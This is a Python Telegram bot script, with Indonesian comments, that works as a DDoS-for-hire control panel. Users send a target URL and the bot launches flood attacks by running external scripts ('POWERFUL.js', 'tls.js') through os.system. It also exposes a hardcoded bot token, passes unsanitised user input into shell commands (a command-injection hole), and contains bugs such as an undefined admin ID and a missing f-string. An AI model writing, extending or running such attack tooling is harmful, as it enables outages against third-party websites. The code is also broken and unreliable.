import telebot
import os
import time

# Inisialisasi bot dengan token bot Anda
bot = telebot.TeleBot('6388514873:AAFkOzS34BRXKJAs7T2RT0tfVjwwJAvlIb0')

# Daftar pengguna VVIP
vvip_users = []

# Variabel status serangan DDOS
is_ddos_running = False
is_freeflood_running = False    

# Menangani perintah /addvip
@bot.message_handler(commands=['addvip'])
def handle_addvip(message):
    # Verifikasi kredensial pengguna
    if message.from_user.id == ADMIN_USER_ID:
        # Tambahkan pengguna ke daftar pengguna VVIP
        vvip_users.append(message.from_user.id)
        bot.reply_to(message, "Pengguna berhasil ditambahkan sebagai VVIP.")
    else:
        bot.reply_to(message, "Anda tidak memiliki izin untuk menambahkan pengguna VVIP.")

# Menangani perintah /ddos
@bot.message_handler(commands=['ddos'])
def handle_ddos(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_ddos_running
        if not is_ddos_running:
            msg = bot.send_message(message.chat.id, "Masukkan target:")
            bot.register_next_step_handler(msg, perform_ddos)
        else:
            bot.reply_to(message, "Serangan DDOS sedang berjalan.")
    else:
        bot.reply_to(message, "Anda tidak memiliki izin untuk menggunakan fitur ini.")

# Menjalankan serangan DDOS
def perform_ddos(message):
    global is_ddos_running
    url = message.text
    bot.send_message(message.chat.id, "Serangan dimulai")
    is_ddos_running = True
    os.system(f"node POWERFUL.js {url} 60 95500 ssl.txt")
    time.sleep(60)  # Tunggu selama 60 detik
    is_ddos_running = False
    bot.send_message(message.chat.id, "Serangan DDOS telah dihentikan.")

@bot.message_handler(commands=['freeflood'])
def handle_freeflood(message):
    global is_freeflood_running
    if not is_freeflood_running:
        msg = bot.send_message(message.chat.id, "Masukkan target:")
        bot.register_next_step_handler(msg, perform_freeflood)
    else:
        bot.reply_to(message, "Serangan freeflood sedang berjalan.")

# Menjalankan serangan freeflood
def perform_freeflood(message):
    global is_freeflood_running
    url = message.text
    bot.send_message(message.chat.id, "Serangan freeflood dimulai")
    is_freeflood_running = True
    # Tambahkan logika serangan freeflood di sini
    os.system("node tls.js {url} 20")
    time.sleep(20)  # Tunggu selama 60 detik
    is_freeflood_running = False
    bot.send_message(message.chat.id, "Serangan freeflood telah dihentikan.")

# Menangani pesan teks dari pengguna
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.from_user.id in vvip_users:
        bot.reply_to(message, "Halo, pengguna VVIP!")
    else:
        bot.reply_to(message, "Halo, pengguna biasa.")

# Menjalankan bot
bot.polling()
